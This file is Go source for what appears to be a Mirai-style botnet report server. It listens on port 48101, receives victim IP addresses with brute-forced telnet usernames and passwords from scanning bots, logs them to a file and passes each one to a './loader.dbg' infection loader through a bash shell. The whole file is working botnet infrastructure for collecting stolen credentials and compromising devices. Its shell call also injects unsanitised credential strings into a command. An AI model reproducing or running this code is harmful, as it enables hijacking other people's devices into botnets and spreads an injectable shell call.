package main

import (
    "fmt"
    "net"
    "encoding/binary"
    "errors"
    "time"
    "os/exec"
    "log"
	"io/ioutil"
	"strings"
)

func main() {
    l, err := net.Listen("tcp", "0.0.0.0:48101")
    if err != nil {
        fmt.Println(err)
        return
    }

    for {
        conn, err := l.Accept()
        if err != nil {
            break
        }
        go handleConnection(conn)
    }
}

func handleConnection(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(10 * time.Second))

    bufChk, err := readXBytes(conn, 1)
    if err != nil {
        return
    }

    var ipInt uint32
    var portInt uint16

    if bufChk[0] == 0 {
        ipBuf, err := readXBytes(conn, 4)
        if err != nil {
            return
        }
        ipInt = binary.BigEndian.Uint32(ipBuf)

        portBuf, err := readXBytes(conn, 2)
        if err != nil {
            return;
        }

        portInt = binary.BigEndian.Uint16(portBuf)
    } else {
        ipBuf, err := readXBytes(conn, 3)
        if err != nil {
            return;
        }
        ipBuf = append(bufChk, ipBuf...)

        ipInt = binary.BigEndian.Uint32(ipBuf)

        portInt = 23
    }

    uLenBuf, err := readXBytes(conn, 1)
    if err != nil {
        return
    }
    usernameBuf, err := readXBytes(conn, int(byte(uLenBuf[0])))

    pLenBuf, err := readXBytes(conn, 1)
    if err != nil {
        return
    }
    passwordBuf, err := readXBytes(conn, int(byte(pLenBuf[0])))
    if err != nil {
        return
    }
	var checked = false;
	input, err := ioutil.ReadFile("checked")
    if err != nil {
            log.Fatalln(err)
    }
	//fmt.Println("Reading input %d.%d.%d.%d\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff)
    lines := strings.Split(string(input), "\n")

    for _, line := range lines {
            if strings.Contains(line, fmt.Sprintf("%d.%d.%d.%d", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff)) {
					//fmt.Println("%d.%d.%d.%d already in checked\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff)
                    checked = true
					break
            }
    }

	if checked == false {
		//fmt.Println("%d.%d.%d.%d being added\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff)
		var output = fmt.Sprintf("%d.%d.%d.%d:%d %s:%s\n", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf))
		err = ioutil.WriteFile("checked", []byte(output), 0644)
		if err != nil {
		        log.Fatalln(err)
		    }
		//runcmd("mkdir test", true);
		runcmd(fmt.Sprintf("./loader.dbg %d.%d.%d.%d:%d %s:%s", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff, portInt, string(usernameBuf), string(passwordBuf)), true)
	}
	
}

func readXBytes(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, errors.New("Failed to read")
        }
        tl += rd
    }

    return buf, nil
}

func runcmd(cmd string, shell bool) []byte {
    if shell {
        out, err := exec.Command("bash", "-c", cmd).Output()
        if err != nil {
            log.Fatal(err)
            panic("some error found")
        }
        return out
    }
    out, err := exec.Command(cmd).Output()
    if err != nil {
        log.Fatal(err)
    }
    return out
}
